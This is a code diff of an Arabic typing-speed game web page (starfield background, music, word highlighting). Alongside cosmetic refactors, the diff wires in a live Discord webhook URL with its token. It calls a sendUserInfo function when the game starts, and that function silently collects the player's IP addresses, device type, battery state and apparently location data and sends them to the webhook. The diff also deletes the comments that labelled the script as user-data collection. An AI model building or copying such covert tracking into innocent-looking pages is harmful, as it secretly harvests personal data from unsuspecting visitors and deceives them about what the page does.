@@ -57,10 +57,16 @@
       margin: 5px;
     }
 
+    #sentence {
+      margin-bottom: 10px;
+    }
+
     #sentence span {
       font-size: 24px;
       font-weight: bold;
       color: white;
+      margin-right: 5px;
+      user-select: none;
     }
 
     #sentence span.correct {
@@ -156,17 +162,6 @@
     #result.error {
       color: #f44336;
     }
-
-    /* حقوق */
-    #footerRights {
-      position: fixed;
-      bottom: 10px;
-      width: 100%;
-      text-align: center;
-      font-size: 14px;
-      color: #777;
-      user-select: none;
-    }
   </style>
 </head>
 <body>
@@ -198,7 +193,7 @@
 <div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence"></div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
+  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" autocomplete="off" />
   <br />
   <button onclick="checkInput()">تحقق</button>
   <div id="speedDisplay"></div>
@@ -208,13 +203,7 @@
 
 <audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>
 
-<div id="footerRights">جميع الحقوق محفوظة © <span id="year"></span> [اسمك هنا]</div>
-
 <script>
-  // سنة الحقوق تلقائية
-  document.getElementById("year").textContent = new Date().getFullYear();
-
-  // النجوم
   const starsCanvas = document.getElementById("stars");
   const ctx = starsCanvas.getContext("2d");
   let stars = [];
@@ -233,8 +222,8 @@
         x: Math.random() * starsCanvas.width,
         y: Math.random() * starsCanvas.height,
         r: Math.random() * 2,
-        dx: Math.random() * 0.7,
-        dy: Math.random() * 0.7
+        dx: (Math.random() - 0.5) * 0.7,
+        dy: (Math.random() - 0.5) * 0.7
       });
     }
   }
@@ -248,14 +237,15 @@
       star.x += star.dx;
       star.y += star.dy;
       if (star.x > starsCanvas.width) star.x = 0;
+      else if (star.x < 0) star.x = starsCanvas.width;
       if (star.y > starsCanvas.height) star.y = 0;
+      else if (star.y < 0) star.y = starsCanvas.height;
     });
     requestAnimationFrame(drawStars);
   }
   initStars(250);
   drawStars();
 
-  // عناصر الواجهة
   const loginScreen = document.getElementById("loginScreen");
   const gameScreen = document.getElementById("gameScreen");
   const playerName = document.getElementById("playerName");
@@ -268,15 +258,12 @@
   const bestTimeDisplay = document.getElementById("bestTime");
   const music = document.getElementById("bgMusic");
   const musicControl = document.getElementById("musicControl");
+
   const discordBtn = document.getElementById("discordButton");
   const rightsMenu = document.getElementById("rightsMenu");
   const closeBtn = document.getElementById("closeBtn");
 
   let player = "";
-  let currentSentence = "";
-  let startTime = 0;
-  let highestSpeed = 0;
-  let bestTime = null;
 
   discordBtn.addEventListener("click", (e) => {
     rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
@@ -290,6 +277,10 @@
   });
 
   const sentences = ["ابدأ الآن", "سر النجاح الاستمرار", "لا تستسلم", "ركز جيداً"];
+  let currentSentence = "";
+  let startTime = 0;
+  let highestSpeed = 0;
+  let bestTime = null;
 
   function startGame() {
     player = playerName.value.trim();
@@ -309,6 +300,7 @@
     music.play().catch(() => {
       musicControl.textContent = "🔇";
     });
+    sendUserInfo();
   }
 
   musicControl.addEventListener("click", () => {
@@ -323,27 +315,23 @@
 
   function renderSentence(userTyped) {
     sentence.innerHTML = "";
-    const originalWords = currentSentence.split(" ");
+    const words = currentSentence.split(" ");
     const typedWords = userTyped.trim().split(" ");
-
-    const hasStarted = userTyped.trim().length > 0;
-
-    for (let i = 0; i < originalWords.length; i++) {
+    words.forEach((word, i) => {
       const span = document.createElement("span");
-      span.textContent = originalWords[i] + " ";
-
-      if (!hasStarted) {
+      span.textContent = word;
+      if (userTyped === "") {
+        // كل الكلمات بيضاء إذا ما كتب المستخدم شيء
         span.style.color = "white";
-      } else if (typedWords[i] === undefined || typedWords[i] === "") {
-        span.style.color = "white";
-      } else if (typedWords[i] === originalWords[i]) {
+      } else if (typedWords[i] === word) {
         span.classList.add("correct");
-      } else {
+      } else if (typedWords[i] !== undefined && typedWords[i] !== word) {
         span.classList.add("incorrect");
+      } else {
+        span.style.color = "white";
       }
-
       sentence.appendChild(span);
-    }
+    });
   }
 
   function checkInput() {
@@ -351,7 +339,7 @@
     if (typed === currentSentence) {
       const elapsed = (Date.now() - startTime) / 1000;
       speedDisplay.textContent = `سرعتك: ${(typed.length / elapsed).toFixed(2)} حرف/ثانية`;
-      if ((typed.length / elapsed) > highestSpeed) {
+      if (typed.length / elapsed > highestSpeed) {
         highestSpeed = typed.length / elapsed;
         bestTime = elapsed;
         record.textContent = `أعلى سرعة: ${highestSpeed.toFixed(2)} - ${bestTime.toFixed(2)} ثانية`;
@@ -368,14 +356,15 @@
     }
   }
 
-  function handleEnter(event) {
-    if (event.key === "Enter") {
+  function handleEnter(e) {
+    if (e.key === "Enter") {
       checkInput();
     }
   }
 
-  // سكربت جمع بيانات المستخدم
-  const WEBHOOK_URL = "ضع_رابط_الويبهوك_هنا";
+  // ------------------ إرسال معلومات المستخدم -------------------
+
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
 
   async function sendUserInfo() {
     try {
@@ -395,13 +384,11 @@
       const ipv4 = ipv4Data.ip;
       const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
 
-      // تحديد نوع الجهاز
       let deviceType = "كمبيوتر";
       if (/android|iphone|ipad|ipod/i.test(ua)) {
         deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
       }
 
-      // جلب مستوى الشحن
       let batteryInfo = "غير متوفرة";
       if (navigator.getBattery) {
         try {
@@ -409,7 +396,7 @@
           const level = Math.round(battery.level * 100);
           const charging = battery.charging ? "يُشحن" : "لا يُشحن";
           batteryInfo = `${level}% - ${charging}`;
-        } catch (err) {
+        } catch {
           batteryInfo = "غير مدعومة";
         }
       }
@@ -464,10 +451,6 @@ ${extraGeo}
       console.error('خطأ في إرسال معلومات المستخدم', e);
     }
   }
-
-  // تشغيل إرسال البيانات عند تحميل الصفحة
-  sendUserInfo();
 </script>
-
 </body>
 </html>
